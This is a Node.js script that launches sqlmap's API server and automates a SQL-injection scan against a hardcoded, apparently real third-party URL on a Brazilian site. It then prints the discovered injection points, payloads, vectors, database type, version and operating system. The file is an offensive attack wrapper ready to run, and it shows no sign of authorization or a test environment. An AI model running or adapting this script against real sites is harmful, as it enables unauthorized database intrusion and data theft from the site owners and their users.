const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(() => { resolve('') }, ms);
    });
}
async function startApi() {
    return new Promise(async (resolve, reject) => {
        const sqlmapProcess = spawn('python', ['sqlmapapi.py', '-s', '-H', '127.0.0.1', '-p', '8775']);
        sqlmapProcess.stdout.on('data', async (data) => {

        });
        sqlmapProcess.stderr.on('data', (data) => {
            console.error(`stderr: ${data}`);
            reject(data);
        });
        sqlmapProcess.on('close', (code) => {
            console.log(`child process exited with code ${code}`);
            if (code === 0) {
                resolve(); // Resolve a promessa se o processo for encerrado com sucesso
            } else {
                reject(`Process exited with code ${code}`); // Rejeita a promessa em caso de código de saída não zero
            }
        });
    });
}

async function sqliStart(target) {
    try {
        const response = await axios('http://127.0.0.1:8775/task/new');
        const data = response.data;
        console.log(target)
        const url = target;
        if (data.success) {
            const taskid = data.taskid;
            console.log(taskid)
            const startResponse = await axios.post(`http://127.0.0.1:8775/scan/${taskid}/start`, {
               url: url
            }, {
                headers: {
                    "Content-Type": "application/json"
                }
            });
            // Inicia o loop para verificar o status a cada 10 segundos
            const intervalId = setInterval(async () => {
                try {
                    const statusResponse = await axios.get(`http://127.0.0.1:8775/scan/${taskid}/status`);
                    const statusData = statusResponse.data;
                    if (statusData.status === 'terminated') {
                        clearInterval(intervalId); 
                        const dataResponse = await axios.get(`http://127.0.0.1:8775/scan/${taskid}/data`);            
                        const dataScan = dataResponse.data.data;
                        if(dataScan != ''){                       	
	                        console.log("[INFO] => [STATUS] ", dataScan[0].status);
	                        console.log("[INFO] => [TYPE] ", dataScan[0].type);
	                        console.log("[INFO] => [URL] ", dataScan[0].value.url);
	                        console.log("[INFO] => [QUERY] ", dataScan[0].value.query);
	                        const logResponse = await axios.get(`http://127.0.0.1:8775/scan/${taskid}/log`);
	                        for([key, value] of Object.entries(logResponse.data.log)){
	                        	console.log(`[TIME] =>  ${value.time}`)
	                        	console.log(`[LEVEL] => ${value.level}`)
	                        	console.log(`[MESSAGE] => ${value.message}`)
	                        }
	                        await sleep(3000)
	                        if (dataResponse.data.data) {	                        	
	                            const dataLogScan1 = dataResponse.data.data[0];
	                            const dataLogScan2 = dataResponse.data.data[1];
	                            console.log("[INFO] => [STATUS] ", dataScan[1].status);
		                        console.log("[INFO] => [TYPE] ", dataScan[1].type);
		                        console.log("[INFO] => [PLACE] ", dataScan[1].value[0].place);
		                        console.log("[INFO] => [PARAMETER] ", dataScan[1].value[0].parameter);
		                        console.log("[INFO] => [PTYPE] ", dataScan[1].value[0].ptype);
		                        console.log("[INFO] => [PREFIX] ", dataScan[1].value[0].prefix);
		                        console.log("[INFO] => [SUFFIX]", dataScan[1].value[0].suffix);
		                        console.log("[INFO] => [CLAUSE] ", dataScan[1].value[0].clause);
		                        console.log("[INFO] => [NOTES] ", dataScan[1].value[0].notes);
		                        const dataInfo = dataScan[1].value[0].data;
		                        for([key, value] of Object.entries(dataInfo)){
		                        	console.log("[INFO]" + " => [INJECT] " + value.title)
		                        	console.log("[INFO]" + " => [PAYLOAD] " + value.payload)
		                        	console.log("[INFO]" + " => [WHERE] " + value.where)
		                        	console.log("[INFO]" + " => [VECTOR] " + value.vector)
		                        	console.log("[INFO]" + " => [COMMENT] " + value.comment)
		                        	console.log("[INFO]" + " => [TEMPLATE] " + value.templatePayload)
		                        	console.log("[INFO]" + " => [RATIO] " + value.matchRatio)
		                        	console.log("[INFO]" + " => [TRUE] Code " + value.trueCode)
		                        	console.log("[INFO]" + " => [FALSE] code " + value.title)
		                        }
		                        const databases = dataScan[1].value[0].dbms
		                        console.log("Dbms: ", databases.toString());
		                        console.log("Version: ", dataScan[1].value[0].dbms_version);
		                        console.log("Os: ", dataScan[1].value[0].os);		                        
	                        }
                        }else{
                        	console.log("Not A vulnerable")
                        } 
                        
                    } else {
                        console.log("please wait...");
                    }
                } catch (error) {
                    console.error("Error in status  scan:", error);
                }
            }, 5000);
        } else {
            console.error("Error in create task:", data);
        }
    } catch (error) {
        console.error("Error in execute SQL Injection:", error);
    }
}


async function init() {
    try {
       startApi();
       await sleep(10000);
       let target = 'http://www.hoven.com.br/lam_desc.php?id=80';
       await sqliStart(target)
    } catch (error) {
        console.error("Erro in start api:", error);
    }
}

init();
